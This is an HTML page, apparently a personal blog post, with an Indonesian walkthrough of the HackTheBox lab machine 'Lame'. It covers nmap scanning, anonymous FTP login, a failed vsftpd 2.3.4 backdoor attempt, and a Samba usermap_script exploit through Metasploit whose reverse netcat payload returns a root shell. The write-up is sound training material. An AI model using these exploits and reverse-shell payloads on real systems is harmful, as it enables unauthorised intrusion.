@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            [Writeup][HackTheBox] Lame  &ndash;
+        
+        Justakazh
+    </title>
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://justakazh.github.io/css/styles.26d59987c529c11f19dac0cd80af6b1379e56b7b612cae93654fdd40a27f308dc8961937dba7b34e8451321ffc6d66bfcf1fdd9d2602acb2bdee877e78ba4345.css integrity="sha512-JtWZh8UpwR8Z2sDNgK9rE3nla3thLK6TZU/dQKJ/MI3Ilhk326ezToRRMh/8bWa/zx/dnSYCrLK97od&#43;eLpDRQ==" />
+<meta name="author" content="Justakazh" />
+
+    
+        <meta name="keywords" content='easy, hackhebox, hacking, linux, samba, writeup, 445' />
+    
+    
+        <meta name="description" content=" : Lame
+Machine Difficult : Easy
+Machine Author : ch4p
+Machine URL : Hack The Box
+NMAP ENUMERATION ┌──(punktester㉿kali)-[~/…/ctf/htb/easy/lame] └─$ sudo nmap -sV 10.10.10.3 Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-13 12:35 HST Nmap scan report for lame.htb (10.10.10.3) Host is up (0.38s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2." />
+    
+
+<meta property="og:site_name"
+    content='Justakazh' />
+
+    <meta property="og:title" content="[Writeup][HackTheBox] Lame" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Justakazh" />
+    <meta
+        property="article:published_time"
+        content='2022-09-29T06:49:09Z-1000' />
+    
+        
+            <meta property="article:tag" content="easy" />
+        
+            <meta property="article:tag" content="hackhebox" />
+        
+            <meta property="article:tag" content="hacking" />
+        
+            <meta property="article:tag" content="linux" />
+        
+            <meta property="article:tag" content="samba" />
+        
+            <meta property="article:tag" content="writeup" />
+        
+            <meta property="article:tag" content="445" />
+        
+    
+    <meta property="og:url" content="https://justakazh.github.io/posts/writeuphackthebox-lame/" />
+    <meta property="og:image"
+        content='https://justakazh.github.io/icon512.png
+    ' />
+    
+        <meta property="og:description" content="Summary Machine Name : Lame
+Machine Difficult : Easy
+Machine Author : ch4p
+Machine URL : Hack The Box
+NMAP ENUMERATION ┌──(punktester㉿kali)-[~/…/ctf/htb/easy/la" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='justakazh.github.io'
+/>
+<meta property="twitter:url" content="https://justakazh.github.io/posts/writeuphackthebox-lame/" />
+
+
+    <meta name="twitter:title" content="[Writeup][HackTheBox] Lame" />
+    
+    <meta name="twitter:image"
+        content='https://justakazh.github.io/icon512.png
+    ' />
+    
+        <meta name="twitter:description" content="Summary Machine Name : Lame
+Machine Difficult : Easy
+Machine Author : ch4p
+Machine URL : Hack The Box
+NMAP ENUMERATION ┌──(punktester㉿kali)-[~/…/ctf/htb/easy/la" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<pre>                                            
+      _           _        _             _     
+     | |_   _ ___| |_ __ _| | ____ _ ___| |__  
+  _  | | | | / __| __/ _` | |/ / _` |_  / '_ \ 
+ | |_| | |_| \__ \ || (_| |   &lt; (_| |/ /| | | |
+  \___/ \__,_|___/\__\__,_|_|\_\__,_/___|_| |_|
+                                                                                            </pre><div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                   
+                </a>
+            
+
+            <div class="rightOfLogo">
+                <div id="wide_nav">
+<nav>
+
+    
+<br>
+<br />
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+	<li><a href="/tags">Tags</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+        
+            <li><a href="/donate/">Donate</a></li>
+        
+            <li><a href="">HackStreet</a></li>
+        
+        
+            
+        
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://facebook.com/hs1337">
+    
+    
+        &#xf09a;
+    
+    <span>
+        facebook
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/justakazh">
+    
+    
+        &#xf09b;
+    
+    <span>
+        Github
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://twitter.com/akazh18">
+    
+    
+        &#xf099;
+    
+    <span>
+        Twitter
+    </span>
+</a>
+
+    </div>
+    
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>[Writeup][HackTheBox] Lame</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2022-09-29
+
+</p>
+    
+    
+    
+    
+    <div><h2 id="summary">Summary</h2>
+<p>Machine Name : Lame</p>
+<p>Machine Difficult : Easy</p>
+<p>Machine Author : <a href="https://app.hackthebox.com/users/1">ch4p</a></p>
+<p>Machine URL : <a href="https://app.hackthebox.com/machines/Lame">Hack The Box</a></p>
+<h2 id="nmap-enumeration">NMAP ENUMERATION</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>punktester㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/ctf/htb/easy/lame<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -sV 10.10.10.3                                   
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-10-13 12:35 HST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> lame.htb <span style="color:#f92672">(</span>10.10.10.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.38s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">996</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE     VERSION
+</span></span><span style="display:flex;"><span>21/tcp  open  ftp         vsftpd 2.3.4
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 42.63 seconds
+</span></span><span style="display:flex;"><span>zsh: segmentation fault  sudo nmap -sV 10.10.10.3
+</span></span></code></pre></div><h3 id="21---ftp">21 - FTP</h3>
+<p>Target tersebut memiliki port 21 yang dimana port tersebut merupakan port dari Service FTP, target tersebut menggunakan FTP vsftpd 2.3.4. disini saya tertarik untuk mencoba melakukan anonymous login pada FTP tersebut</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>punktester㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ftp lame.htb <span style="color:#ae81ff">21</span>
+</span></span><span style="display:flex;"><span>Connected to lame.htb.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 2.3.4<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Name <span style="color:#f92672">(</span>lame.htb:punktester<span style="color:#f92672">)</span>: anonymous
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">331</span> Please specify the password.
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">230</span> Login successful.
+</span></span><span style="display:flex;"><span>Remote system type is UNIX.
+</span></span><span style="display:flex;"><span>Using binary mode to transfer files.
+</span></span><span style="display:flex;"><span>ftp&gt; 
+</span></span></code></pre></div><p>Service tersebut mengizinkan seseorang untuk login menggunakan akun anonymous, sayangnya saya tidak bisa mencari informasi lebih jauh lagi dikarenakan konfigurasi dari ftp tersebut. selanjutnya saya mencoba mencari exploit untuk vsftpd 2.3.4 pada metasploit</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/samba/usermap_script<span style="color:#f92672">)</span> &gt; search vsftpd 2.3.4
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#  Name                                  Disclosure Date  Rank       Check  Description</span>
+</span></span><span style="display:flex;"><span>   -  ----                                  ---------------  ----       -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Interact with a module by name or index. For example info 0, use <span style="color:#ae81ff">0</span> or use exploit/unix/ftp/vsftpd_234_backdoor
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/samba/usermap_script<span style="color:#f92672">)</span> &gt; 
+</span></span></code></pre></div><p>saya menemukan exploit/unix/ftp/vsftpd_234_backdoor yang dimana modul ini adalah untuk memicu vsf_sysutil_extra(); berfungsi dengan mengirimkan urutan byte tertentu
+pada port 21, ketika eksekusi berhasil maka akan menghasilkan pembukaan backdoor pada sistem</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/ftp/vsftpd_234_backdoor<span style="color:#f92672">)</span> &gt; options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/unix/ftp/vsftpd_234_backdoor<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name    Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----    ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   RHOSTS  lame.htb         yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/U
+</span></span><span style="display:flex;"><span>                                      sing-Metasploit
+</span></span><span style="display:flex;"><span>   RPORT   <span style="color:#ae81ff">21</span>               yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>cmd/unix/interact<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name  Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----  ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exploit target:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   Automatic
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/ftp/vsftpd_234_backdoor<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.3:21 - Banner: <span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 2.3.4<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.3:21 - USER: <span style="color:#ae81ff">331</span> Please specify the password.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit completed, but no session was created.
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/ftp/vsftpd_234_backdoor<span style="color:#f92672">)</span> &gt; 
+</span></span></code></pre></div><p>sayangnya disini saya tidak berhasil melakukan exploitasi tersebut :')</p>
+<h3 id="22---ssh">22 - SSH</h3>
+<p>target tersebut menggunakan SSH dengan versi OpenSSH 4.7p1. ini merupakan versi yang sudah usang, disini saya mencoba untuk mencari exploit untuk versi tersebut dengan searchsploit</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>punktester㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ searchsploit OpenSSH 4.7
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                                                     |  Path
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span>OpenSSH 2.3 &lt; 7.7 - Username Enumeration                                                                           | linux/remote/45233.py
+</span></span><span style="display:flex;"><span>OpenSSH 2.3 &lt; 7.7 - Username Enumeration <span style="color:#f92672">(</span>PoC<span style="color:#f92672">)</span>                                                                     | linux/remote/45210.py
+</span></span><span style="display:flex;"><span>OpenSSH &lt; 7.4 - <span style="color:#e6db74">&#39;UsePrivilegeSeparation Disabled&#39;</span> Forwarded Unix Domain Sockets Privilege Escalation               | linux/local/40962.txt
+</span></span><span style="display:flex;"><span>OpenSSH &lt; 7.4 - agent Protocol Arbitrary Library Loading                                                           | linux/remote/40963.txt
+</span></span><span style="display:flex;"><span>OpenSSH &lt; 7.7 - User Enumeration <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                                                               | linux/remote/45939.py
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span></code></pre></div><p>tidak ada exploit menarik yang berimpact critical untuk versi tersebut, disini saya akan melewati celah tersebut dan saya akan menggunakan exploit tersebut ketika saya membutuhkannya.</p>
+<h3 id="139445---samba">139,445 - SAMBA</h3>
+<p>target tersebut memiliki port 139 dan 445 untuk service Samba dengan versi smbd 3.X - 4.X. selanjutnya saya mencoba untuk mencari exploit untuk versi tersebut pada metasploit</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/samba/usermap_script<span style="color:#f92672">)</span> &gt; search type:exploit samba
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#   Name                                                 Disclosure Date  Rank       Check  Description</span>
+</span></span><span style="display:flex;"><span>   -   ----                                                 ---------------  ----       -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   exploit/unix/webapp/citrix_access_gateway_exec       2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>   exploit/windows/license/calicclnt_getconfig          2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>   exploit/unix/misc/distcc_exec                        2002-02-01       excellent  Yes    DistCC Daemon Command Execution
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>   exploit/windows/smb/group_policy_startup             2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>   exploit/windows/fileformat/ms14_060_sandworm         2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">5</span>   exploit/unix/http/quest_kace_systems_management_rce  2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">6</span>   exploit/multi/samba/usermap_script                   2007-05-14       excellent  No     Samba <span style="color:#e6db74">&#34;username map script&#34;</span> Command Execution
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">7</span>   exploit/multi/samba/nttrans                          2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">8</span>   exploit/linux/samba/setinfopolicy_heap               2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">9</span>   exploit/linux/samba/chain_reply                      2010-06-16       good       No     Samba chain_reply Memory Corruption <span style="color:#f92672">(</span>Linux x86<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">10</span>  exploit/linux/samba/is_known_pipename                2017-03-24       excellent  Yes    Samba is_known_pipename<span style="color:#f92672">()</span> Arbitrary Module Load
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">11</span>  exploit/linux/samba/lsa_transnames_heap              2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">12</span>  exploit/osx/samba/lsa_transnames_heap                2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">13</span>  exploit/solaris/samba/lsa_transnames_heap            2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">14</span>  exploit/freebsd/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow <span style="color:#f92672">(</span>*BSD x86<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">15</span>  exploit/linux/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow <span style="color:#f92672">(</span>Linux x86<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">16</span>  exploit/osx/samba/trans2open                         2003-04-07       great      No     Samba trans2open Overflow <span style="color:#f92672">(</span>Mac OS X PPC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">17</span>  exploit/solaris/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow <span style="color:#f92672">(</span>Solaris SPARC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">18</span>  exploit/windows/http/sambar6_search_results          2003-06-21       normal     Yes    Sambar <span style="color:#ae81ff">6</span> Search Results Buffer Overflow
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Interact with a module by name or index. For example info 18, use <span style="color:#ae81ff">18</span> or use exploit/windows/http/sambar6_search_results
+</span></span></code></pre></div><p>terdapat 18 modul yang saya temukan untuk exploit samba tersebut, setelah saya telusuri lebih lanjut target tersebut berpotensi rentan terhadap <strong>Samba &ldquo;username map script&rdquo; Command Execution</strong> yaitu pada module nomor 6 <strong>exploit/multi/samba/usermap_script</strong> yang dimana Modul ini mengeksploitasi kerentanan eksekusi perintah di Samba versi 3.0.20 hingga 3.0.25rc3 karena saat menggunakan non-default opsi konfigurasi &ldquo;username map script&rdquo;. Dengan menentukan nama pengguna mengandung karakter meta shell, sehingga penyerang dapat melakukan RCE pada sistem tersebut.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/samba/usermap_script<span style="color:#f92672">)</span> &gt; options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/multi/samba/usermap_script<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name    Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----    ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   RHOSTS  lame.htb         yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+</span></span><span style="display:flex;"><span>   RPORT   <span style="color:#ae81ff">139</span>              yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>cmd/unix/reverse_netcat<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name   Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----   ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   LHOST  10.10.16.4       yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exploit target:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   Automatic
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/samba/usermap_script<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.16.4:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">2</span> opened <span style="color:#f92672">(</span>10.10.16.4:4444 -&gt; 10.10.10.3:36449 <span style="color:#f92672">)</span> at 2022-10-13 13:11:09 -1000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>pwd
+</span></span><span style="display:flex;"><span>/
+</span></span></code></pre></div><p>GOTCHA! saya berhasil mendapatkan akses tersebut. disini menunjukan bahwa saya mendapatkan akses root pada server tersebut, atau dapat disimpulkan saya tidak perlu melakukan privilege escalation untuk mendapatkan akses root :D</p>
+</div>
+</article>
+
+    <hr />
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                href="/tags/easy">#easy</a>
+        
+            <a
+                
+                href="/tags/hackhebox">#hackhebox</a>
+        
+            <a
+                
+                href="/tags/hacking">#hacking</a>
+        
+            <a
+                
+                href="/tags/linux">#linux</a>
+        
+            <a
+                
+                href="/tags/samba">#samba</a>
+        
+            <a
+                
+                href="/tags/writeup">#writeup</a>
+        
+            <a
+                
+                href="/tags/445">#445</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+<p><small>
+        2022 &copy; Justakazh - Nulis karena pelupa
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
